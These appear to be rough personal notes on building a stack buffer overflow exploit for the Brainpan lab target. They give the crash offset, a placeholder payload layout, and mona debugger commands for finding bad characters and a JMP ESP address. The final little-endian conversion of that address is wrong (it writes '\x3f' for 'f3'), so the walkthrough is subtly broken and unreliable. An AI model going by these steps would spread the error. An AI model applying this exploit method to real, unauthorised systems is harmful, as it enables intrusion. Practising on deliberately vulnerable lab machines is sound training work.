Prt 1.........


crash point 600

offset exact crash poing 515


finding badchar with setting dir by mona script..

!mona config -set workingfolder c:\logs\%p

Since we have the exact offset value we can varify the eip 

by sending the payload in format...

buffer = 'A'* valueoffset
eip = 'B' * 4 
shellcode= 'C' * 300



Part 2 .......>>>>>>>

then 

Genrating bad char arrey 

!mona bytearray -b '\x00'

after sending the payload compairing the badchars...

!mona compare -f C:\logs\brainpan\bytearray.bin -a 005FF910   Where ('005ff910') is ESP stack pointer 


if you see there is no bad char ...means the program has no extra badchar except:\x00

vulnrable program...

!mona modules

and when we find any prgram which is false by every module...

!mona find -s "\xff\xe4" -m brainpan.exe


this will retun jump esp address ...we have to note it down..

311712f3

and this is going to be used in eip variable...

write it in little endian format which is 

'\x3f\x12\x17\x31'
